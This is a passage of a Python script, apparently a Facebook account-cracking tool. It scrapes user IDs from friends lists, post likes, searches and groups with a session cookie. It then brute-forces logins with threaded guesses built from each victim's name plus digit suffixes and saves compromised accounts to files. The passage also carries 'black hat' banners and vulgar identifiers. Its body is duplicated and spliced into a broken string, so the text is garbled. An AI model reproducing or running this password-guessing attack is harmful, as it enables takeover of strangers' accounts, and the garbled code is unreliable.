                if 'profile' in user[0]:
                    id.append(user[1] + "|" + re.findall("=(\d*)", str(user[0]))[0])
                else:
                    id.append(user[1] + "|" + user[0].split('/')[1])
                print(
                    f'\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ',
                    end="")
            if 'Lihat Selengkapnya' in str(like):
                getlike(mbasic.format(parser(like, 'html.parser').find('a', string="Lihat Selengkapnya")["href"]))
            return id

        def bysearch(option):
            search = requests.get(option, cookies=kuki).content
            users = re.findall('class="x ch"><a href="/(.*?)"><div.*?class="cj">(.*?)</div>', str(search))
            for user in users:
                if "profile" in user[0]:
                    id.append(user[1] + "|" + re.findall("=(\d*)", str(user[0]))[0])
                else:
                    id.append(user[1] + "|" + user[0].split("?")[0])
                print(
                    f"\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ",
                    end="")
            if "Lihat Hasil Selanjutnya" in str(search):
                bysearch(parser(search, 'html.parser').find("a", string="Lihat Hasil Selanjutnya")["href"])
            return id

        def grubid(endpoint):
            grab = requests.get(endpoint, cookies=kuki).content
            users = re.findall('a class=".." href="/(.*?)">(.*?)</a>', str(grab))
            for user in users:
                if "profile" in user[0]:
                    id.append(user[1] + "|" + re.findall('id=(\d*)', str(user[0]))[0])
                else:
                    id.append(user[1] + "|" + user[0])
                print(
                    f"\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ",
                    end="")
            if "Lihat Selengkapnya" in str(grab):
                grubid(mbasic.format(parser(grab, "html.parser").find("a", string="Lihat Selengkapnya")["href"]))
            return id

        if __name__ == '__main__':
            try:
                ses = requests.Session()
                kukis = masuk()
                kuki = {'cookie': kukis}
                ikeh_ikeh_kimochi()
                kontol()
                aahh('\033[1;97m [\033[1;92m01\033[1;97m] Crack From ID Friend')
                aahh('\033[1;97m [\033[1;92m02\033[1;97m] Crack From ID Link Posting')
                aahh('\033[1;97m [\033[1;92m03\033[1;97m] Crack From ID Search Name')
                aahh('\033[1;97m [\033[1;92m04\033[1;97m] Crack From ID Group ')
                aahh('\033[1;97m [\033[1;92m05\033[1;97m] Crack From ID Publick ')
                aahh('\033[1;97m [\033[1;92m06\033[1;97m] View Crack Results')
                aahh('\033[1;97m [\033[1;92m07\033[1;97m] Delete Cookies')
                aahh('\033[1;97m [\033[1;91m00\033[1;97m] Exit')
                print('\x1b[1;94m────────────────────────────────────────────────────')
                memek = input('\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ')
                if memek == "":
                    print("\n\n\033[00m [\033[91m!\033[00m] Wrong Input!")
                    yayanxd()
                elif memek == '0' or memek == '00':
                    aahh(
                        "\n\033[1;92m Thank you for using my tools.\n  Don't forget to fallow to My Facebook account.\n\n")
                    os.system('xdg-open https://shorturl.at/MO019.I.AM.User401.Im.silent')
                    exit()
                elif memek == '7' or memek == '07':
                    print("\n\x1b[1;97m [\x1b[1;96m+\x1b[1;97m] \x1b[1;96mPlease Wait... ")
                    aahh("\x1b[1;92m • 10")
                    aahh("\x1b[1;93m •• 20")
                    aahh("\x1b[1;94m ••• 30")
                    aahh("\x1b[1;95m •••• 40")
                    aahh("\x1b[1;96m ••••• 50")
                    aahh("\x1b[1;97m •••••• 60")
                    aahh("\x1b[1;92m ••••••• 70")
                    aahh("\x1b[1;91m •••••••• 80")
                    aahh("\x1b[1;96m ••••••••• 90")
                    aahh("\x1b[1;94m •••••••••• 100%")
                    os.system("rm -rf cookies")
                    print("\n\x1b[1;97m [\x1b[1;92m√\x1b[1;97m]\x1b[1;92m Deleted Successfully!")
                    yayanxd()
                elif memek == '1' or memek == '01':
                    url = parser(ses.get(mbasic.format('/me'), cookies=kuki).content, 'html.parser').find('a',
                                                                                                          string='Teman')
                    username = getid(mbasic.format(url["href"]))
                elif memek == '2' or memek == '02':
                    username = input("\033[1;97m\n [\033[1;96m?\033[1;97m] Link Post \033[1;91m: \033[1;92m")
                    if username == "":
                        exit("\033[00m[\033[91m!\033[00m] Cannot be empty!")
                    elif 'www.facebook' in username:
                        username = username.replace('www.facebook', 'mbasic.facebook')
                    elif 'www.facebook' in username:
                        username = username.replace('m.facebook', 'mbasic.facebook.com')
                    username = fromlikes(username)
                elif memek == '3' or memek == '03':
                    knf = input(
                        "\033[1;97m\n [\033[1;96m?\033[1;97m] The Name You Want To Search For \033[1;91m: \033[1;92m")
                    username = bysearch(mbasic.format('/search/people/?q=' + knf))
                    if len(username) == 0:
                        exit("\033[90m[\033[91m!\033[90m] No Name!")
                elif memek == '4' or memek == '04':
                    print("\033[1;97m\n [\033[1;94m•\033[1;97m] Can Only Take \033[91m100 \033[00mID ")
                    grab = input("\033[1;97m[\033[1;96m?\033[1;97m] \033[00mID group \033[1;91m: \033[1;92m")
                    username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
                    if len(username) == 0:
                        exit("\033[00m[\033[91m!\033[00m] Group ID None!")
                elif memek == '5' or memek == '05':
                    knf = input("\033[1;97m\n [\033[1;96m?\033[1;97m] Username/Id \033[1;91m: \033[1;92m")
                    if knf.isdigit():
                        user = "/profile.php?id=" + knf
                    else:
                        user = "/" + knf
                    try:
                        user = parser(requests.get(mbasic.format(user), cookies=kuki).content, "html.parser").find('a',
                                                                                                                   string="Teman")[
                            "href"]
                        username = getid(mbasic.format(user))
                    except TypeError:
                        exit("\033[00m[\033[91m!\033[00m] \033[97mUser/ID Wrong!")
                elif memek == '6' or memek == '06':
                    try:
                        file1 = open("cp.txt").read()
                        file2 = open("ok.txt").read()
                        a = file1 + file2
                        final = a.strip().split("\n")
                        final = set(final)
                        print(f"\033[97m\n [\033[93m{str(len(final))}\033[97m] Account To Check ")
                        with ThreadPoolExecutor(max_workers=10) as ex:
                            for user in final:
                                a = user.split("|")
                                ex.submit(login, (a[0]), (a[1]), (True))
                        for x in result:
                            with open('ok.txt', 'a') as f:
                                f.write(x + '\n')
                        for x in chek:
                            with open('cp.txt', 'a') as f:
                                f.write(x + "\n")

                        print("\n\x1b[1;97m[\x1b[1;94m•\x1b[1;97m] Crack Done....")
                        print("\x1b[1;97m[\x1b[1;94m✓\x1b[1;97m] Saved To \033[1;93mcp.txt\033[96m|\033[1;92mok.txt")
                    except FileNotFoundError:
                        exit("\n\033[00m[\033[91m!\033[00m] You Didn't Get Results")
                else:
                    print("\n\n \033[00m[\033[91m!\033[00m] Wrong Input!")
                    yayanxd()
                print()
                ikeh_ikeh_kimochi()
                jembut()
                print(
                    '\n\x1b[1;96m        ∆∆∆_______MrFano404 𝙸𝚖 𝚗𝚘𝚝 𝚋𝚊𝚍 𝚒𝚖 𝚢𝚘𝚞 𝚊𝚛𝚎 𝚍𝚊𝚍 . _______∆∆∆')
                print('\x1b[1;95m     疊╔═╦═────••♽••─────═╦═╗疊')
                print('\x1b[1;97m           Total ID\x1b[1;91m :\x1b[1;92m ' + str(
                    len(id)) + "\n\x1b[1;95m     疊╚═╩═────••♽••─────═╩═╝疊\n", end="")
                expass = input("\n\033[1;97m [\033[1;96m?\033[1;97m] Add Password1 \033[1;91m: \033[1;92m")
                expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Add Password2 \033[1;91m: \033[1;92m")
                expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Add Password3 \033[1;91m: \033[1;92m")
                aahh('\x1b[1;94m────────────────────────────────────────────────────\n')
                ikeh_ikeh_kimochi()
                jembut()
                print(
                    '\n\x1b[1;92m        ∆∆∆_______AKASH BLACK HAT ᴴᴬᶜᴷᴱᴿ 𝙸𝚖 𝚗𝚘𝚝 𝚋𝚊𝚍 𝚒𝚖 𝚢𝚘𝚞 𝚊𝚛𝚎 𝚍𝚊𝚍 . _______∆∆∆')
                print('\x1b[1;97m     疊╔═╦═────••♽••─────═╦═╗疊')
                print('\x1b[1;96m           Total ID\x1b[1;91m :\x1b[1;94m ' + str(
                    len(id)) + "\n\x1b[1;97m     疊╚═╩═────••♽••─────═╩═╝疊\n", end="")
                print(
                    '\n\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] the result\x1b[1;92m OK\x1b[1;97m saved to : ok.txt\n [\x1b[1;93m-\x1b[1;97m] the result\x1b[1;93m CP\x1b[1;97m saved to : cp.txt')
                print('\n [\x1b[1;91m!\x1b[1;97m] turn off data to stop the process\n')
                with ThreadPoolExecutor(max_workers=30) as ex:
                    for user in username:
                        users = user.split('|')
                        ss = users[0].split(' ')
                        for x in ss:
                            listpass = [
                                str(x) + '123',
                                str(x) + '1234',
                                str(x) + '12345',
                                str(x) + '123456',
                                str(x) + '1234567',
                                str(x) + '1122',
                                str(x) + '12345689',
                                str(x) + '321',
                                str(x) + '21',
                                str(x) + '4321',
                            ]
                            listpass.append(expass)
                            for passw in set(listpass):
                                ex.submit(login, (users[1]), (passw))
                if check != 0 or result != 0:
                    time.sleep(0.1)
                    print("\n\n\x1b[1;92m  *\x1b[1;97m finished.")

                else:
                    print("\n\n\x1b[1;96m  *\x1b[1;97m you got no results:(")
            except (KeyboardInterrupt, EOFError):
                exit()
            except requests.exceptions.ConnectionError:
                exit("\n\n\033[00m  [\033[91m!\033[00m] no Connection")

    elif yayan == "2" or yayan == "02":
        os.system("xdg-open https://shorturl.at/MO019.I.AM.User401.Im.silent")
        yayanxd()
    elif yayan == "3" or yayan == "03":
        os.system('xdg-open https://shorturl.at/MO019.I.AM.User401.Im.silent')
        yayanxd()
    elif yayan == "4" or yayan == "04":
        os.system('xdg-open https://github.com/MrFano404t')
        yayanxd()
    elif yayan == "5" or yayan == "05":
        print("\n\n\x1b[1;97m      [ \x1b[1;92mPlease Wait While Updating The Tools \x1b[1;97m]\n")
        os.system("git pull")
        print("\n \x1b[1;97m[\x1b[1;92m√\x1b[1;97m]\x1b[1;92m Successfully Updated!\n ")
        yayanxd()
    elif yayan == "0" or yayan == "00":
        aahh("\n\033[1;92m Thank you for using my tools.\n  Don't forget to fallow to Myfacebook account \n\n")
        os.system('xdg-open https://shorturl.at/MO019.I.AM.User401.Im.silent')
        exit()


if __name__ == "                if 'profile' in user[0]:
                    id.append(user[1] + "|" + re.findall("=(\d*)", str(user[0]))[0])
                else:
                    id.append(user[1] + "|" + user[0].split('/')[1])
                print(
                    f'\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ',
                    end="")
            if 'Lihat Selengkapnya' in str(like):
                getlike(mbasic.format(parser(like, 'html.parser').find('a', string="Lihat Selengkapnya")["href"]))
            return id

        def bysearch(option):
            search = requests.get(option, cookies=kuki).content
            users = re.findall('class="x ch"><a href="/(.*?)"><div.*?class="cj">(.*?)</div>', str(search))
            for user in users:
                if "profile" in user[0]:
                    id.append(user[1] + "|" + re.findall("=(\d*)", str(user[0]))[0])
                else:
                    id.append(user[1] + "|" + user[0].split("?")[0])
                print(
                    f"\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ",
                    end="")
            if "Lihat Hasil Selanjutnya" in str(search):
                bysearch(parser(search, 'html.parser').find("a", string="Lihat Hasil Selanjutnya")["href"])
            return id

        def grubid(endpoint):
            grab = requests.get(endpoint, cookies=kuki).content
            users = re.findall('a class=".." href="/(.*?)">(.*?)</a>', str(grab))
            for user in users:
                if "profile" in user[0]:
                    id.append(user[1] + "|" + re.findall('id=(\d*)', str(user[0]))[0])
                else:
                    id.append(user[1] + "|" + user[0])
                print(
                    f"\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ",
                    end="")
            if "Lihat Selengkapnya" in str(grab):
                grubid(mbasic.format(parser(grab, "html.parser").find("a", string="Lihat Selengkapnya")["href"]))
            return id

        if __name__ == '__main__':
            try:
                ses = requests.Session()
                kukis = masuk()
                kuki = {'cookie': kukis}
                ikeh_ikeh_kimochi()
                kontol()
                aahh('\033[1;97m [\033[1;92m01\033[1;97m] Crack From ID Friend')
                aahh('\033[1;97m [\033[1;92m02\033[1;97m] Crack From ID Link Posting')
                aahh('\033[1;97m [\033[1;92m03\033[1;97m] Crack From ID Search Name')
                aahh('\033[1;97m [\033[1;92m04\033[1;97m] Crack From ID Group ')
                aahh('\033[1;97m [\033[1;92m05\033[1;97m] Crack From ID Publick ')
                aahh('\033[1;97m [\033[1;92m06\033[1;97m] View Crack Results')
                aahh('\033[1;97m [\033[1;92m07\033[1;97m] Delete Cookies')
                aahh('\033[1;97m [\033[1;91m00\033[1;97m] Exit')
                print('\x1b[1;94m────────────────────────────────────────────────────')
                memek = input('\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ')
                if memek == "":
                    print("\n\n\033[00m [\033[91m!\033[00m] Wrong Input!")
                    yayanxd()
                elif memek == '0' or memek == '00':
                    aahh(
                        "\n\033[1;92m Thank you for using my tools.\n  Don't forget to fallow to My Facebook account.\n\n")
                    os.system('xdg-open https://shorturl.at/MO019.I.AM.User401.Im.silent')
                    exit()
                elif memek == '7' or memek == '07':
                    print("\n\x1b[1;97m [\x1b[1;96m+\x1b[1;97m] \x1b[1;96mPlease Wait... ")
                    aahh("\x1b[1;92m • 10")
                    aahh("\x1b[1;93m •• 20")
                    aahh("\x1b[1;94m ••• 30")
                    aahh("\x1b[1;95m •••• 40")
                    aahh("\x1b[1;96m ••••• 50")
                    aahh("\x1b[1;97m •••••• 60")
                    aahh("\x1b[1;92m ••••••• 70")
                    aahh("\x1b[1;91m •••••••• 80")
                    aahh("\x1b[1;96m ••••••••• 90")
                    aahh("\x1b[1;94m •••••••••• 100%")
                    os.system("rm -rf cookies")
                    print("\n\x1b[1;97m [\x1b[1;92m√\x1b[1;97m]\x1b[1;92m Deleted Successfully!")
                    yayanxd()
                elif memek == '1' or memek == '01':
                    url = parser(ses.get(mbasic.format('/me'), cookies=kuki).content, 'html.parser').find('a',
                                                                                                          string='Teman')
                    username = getid(mbasic.format(url["href"]))
                elif memek == '2' or memek == '02':
                    username = input("\033[1;97m\n [\033[1;96m?\033[1;97m] Link Post \033[1;91m: \033[1;92m")
                    if username == "":
                        exit("\033[00m[\033[91m!\033[00m] Cannot be empty!")
                    elif 'www.facebook' in username:
                        username = username.replace('www.facebook', 'mbasic.facebook')
                    elif 'www.facebook' in username:
                        username = username.replace('m.facebook', 'mbasic.facebook.com')
                    username = fromlikes(username)
                elif memek == '3' or memek == '03':
                    knf = input(
                        "\033[1;97m\n [\033[1;96m?\033[1;97m] The Name You Want To Search For \033[1;91m: \033[1;92m")
                    username = bysearch(mbasic.format('/search/people/?q=' + knf))
                    if len(username) == 0:
                        exit("\033[90m[\033[91m!\033[90m] No Name!")
                elif memek == '4' or memek == '04':
                    print("\033[1;97m\n [\033[1;94m•\033[1;97m] Can Only Take \033[91m100 \033[00mID ")
                    grab = input("\033[1;97m[\033[1;96m?\033[1;97m] \033[00mID group \033[1;91m: \033[1;92m")
                    username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
                    if len(username) == 0:
                        exit("\033[00m[\033[91m!\033[00m] Group ID None!")
                elif memek == '5' or memek == '05':
                    knf = input("\033[1;97m\n [\033[1;96m?\033[1;97m] Username/Id \033[1;91m: \033[1;92m")
                    if knf.isdigit():
                        user = "/profile.php?id=" + knf
                    else:
                        user = "/" + knf
                    try:
                        user = parser(requests.get(mbasic.format(user), cookies=kuki).content, "html.parser").find('a',
                                                                                                                   string="Teman")[
                            "href"]
                        username = getid(mbasic.format(user))
                    except TypeError:
                        exit("\033[00m[\033[91m!\033[00m] \033[97mUser/ID Wrong!")
                elif memek == '6' or memek == '06':
                    try:
                        file1 = open("cp.txt").read()
                        file2 = open("ok.txt").read()
                        a = file1 + file2
                        final = a.strip().split("\n")
                        final = set(final)
                        print(f"\033[97m\n [\033[93m{str(len(final))}\033[97m] Account To Check ")
                        with ThreadPoolExecutor(max_workers=10) as ex:
                            for user in final:
                                a = user.split("|")
                                ex.submit(login, (a[0]), (a[1]), (True))
                        for x in result:
                            with open('ok.txt', 'a') as f:
                                f.write(x + '\n')
                        for x in chek:
                            with open('cp.txt', 'a') as f:
                                f.write(x + "\n")

                        print("\n\x1b[1;97m[\x1b[1;94m•\x1b[1;97m] Crack Done....")
                        print("\x1b[1;97m[\x1b[1;94m✓\x1b[1;97m] Saved To \033[1;93mcp.txt\033[96m|\033[1;92mok.txt")
                    except FileNotFoundError:
                        exit("\n\033[00m[\033[91m!\033[00m] You Didn't Get Results")
                else:
                    print("\n\n \033[00m[\033[91m!\033[00m] Wrong Input!")
                    yayanxd()
                print()
                ikeh_ikeh_kimochi()
                jembut()
                print(
                    '\n\x1b[1;96m        ∆∆∆_______MrFano404 𝙸𝚖 𝚗𝚘𝚝 𝚋𝚊𝚍 𝚒𝚖 𝚢𝚘𝚞 𝚊𝚛𝚎 𝚍𝚊𝚍 . _______∆∆∆')
                print('\x1b[1;95m     疊╔═╦═────••♽••─────═╦═╗疊')
                print('\x1b[1;97m           Total ID\x1b[1;91m :\x1b[1;92m ' + str(
                    len(id)) + "\n\x1b[1;95m     疊╚═╩═────••♽••─────═╩═╝疊\n", end="")
                expass = input("\n\033[1;97m [\033[1;96m?\033[1;97m] Add Password1 \033[1;91m: \033[1;92m")
                expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Add Password2 \033[1;91m: \033[1;92m")
                expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Add Password3 \033[1;91m: \033[1;92m")
                aahh('\x1b[1;94m────────────────────────────────────────────────────\n')
                ikeh_ikeh_kimochi()
                jembut()
                print(
                    '\n\x1b[1;92m        ∆∆∆_______AKASH BLACK HAT ᴴᴬᶜᴷᴱᴿ 𝙸𝚖 𝚗𝚘𝚝 𝚋𝚊𝚍 𝚒𝚖 𝚢𝚘𝚞 𝚊𝚛𝚎 𝚍𝚊𝚍 . _______∆∆∆')
                print('\x1b[1;97m     疊╔═╦═────••♽••─────═╦═╗疊')
                print('\x1b[1;96m           Total ID\x1b[1;91m :\x1b[1;94m ' + str(
                    len(id)) + "\n\x1b[1;97m     疊╚═╩═────••♽••─────═╩═╝疊\n", end="")
                print(
                    '\n\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] the result\x1b[1;92m OK\x1b[1;97m saved to : ok.txt\n [\x1b[1;93m-\x1b[1;97m] the result\x1b[1;93m CP\x1b[1;97m saved to : cp.txt')
                print('\n [\x1b[1;91m!\x1b[1;97m] turn off data to stop the process\n')
                with ThreadPoolExecutor(max_workers=30) as ex:
                    for user in username:
                        users = user.split('|')
                        ss = users[0].split(' ')
                        for x in ss:
                            listpass = [
                                str(x) + '123',
                                str(x) + '1234',
                                str(x) + '12345',
                                str(x) + '123456',
                                str(x) + '1234567',
                                str(x) + '1122',
                                str(x) + '12345689',
                                str(x) + '321',
                                str(x) + '21',
                                str(x) + '4321',
                            ]
                            listpass.append(expass)
                            for passw in set(listpass):
                                ex.submit(login, (users[1]), (passw))
                if check != 0 or result != 0:
                    time.sleep(0.1)
                    print("\n\n\x1b[1;92m  *\x1b[1;97m finished.")

                else:
                    print("\n\n\x1b[1;96m  *\x1b[1;97m you got no results:(")
            except (KeyboardInterrupt, EOFError):
                exit()
            except requests.exceptions.ConnectionError:
                exit("\n\n\033[00m  [\033[91m!\033[00m] no Connection")

    elif yayan == "2" or yayan == "02":
        os.system("xdg-open https://shorturl.at/MO019.I.AM.User401.Im.silent")
        yayanxd()
    elif yayan == "3" or yayan == "03":
        os.system('xdg-open https://shorturl.at/MO019.I.AM.User401.Im.silent')
        yayanxd()
    elif yayan == "4" or yayan == "04":
        os.system('xdg-open https://github.com/MrFano404t')
        yayanxd()
    elif yayan == "5" or yayan == "05":
        print("\n\n\x1b[1;97m      [ \x1b[1;92mPlease Wait While Updating The Tools \x1b[1;97m]\n")
        os.system("git pull")
        print("\n \x1b[1;97m[\x1b[1;92m√\x1b[1;97m]\x1b[1;92m Successfully Updated!\n ")
        yayanxd()
    elif yayan == "0" or yayan == "00":
        aahh("\n\033[1;92m Thank you for using my tools.\n  Don't forget to fallow to Myfacebook account \n\n")
        os.system('xdg-open https://shorturl.at/MO019.I.AM.User401.Im.silent')
        exit()


if __name__ == "__main__":
    ikeh_ikeh_kimochi()
    croot()
    ikeh_ikeh_kimochi()
    kontol()
    moch_yayan()
    yayanxd()":
    ikeh_ikeh_kimochi()
    croot()
    ikeh_ikeh_kimochi()
    kontol()
    moch_yayan()
    yayanxd()
